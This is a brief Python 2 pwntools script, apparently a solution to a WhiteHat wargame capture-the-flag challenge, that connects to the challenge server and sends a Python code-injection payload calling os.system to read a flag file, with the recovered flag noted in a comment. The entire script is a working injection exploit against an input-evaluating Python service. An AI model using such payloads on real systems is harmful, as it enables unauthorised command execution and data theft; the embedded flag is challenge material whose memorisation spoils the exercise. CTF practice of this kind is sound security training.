#!/usr/bin/env python2
from pwn import *
context(os='linux', arch='i386')
#context.log_level = 'debug'

r=remote('chall04-pwn02.wargame.whitehat.vn','26082')

try:
	print  r.recv()
	r.sendline('(__import__)("os").system("cat /home/inject2/flag")')
except Exception,e:
	print e

#Flag: __S!mplePython__



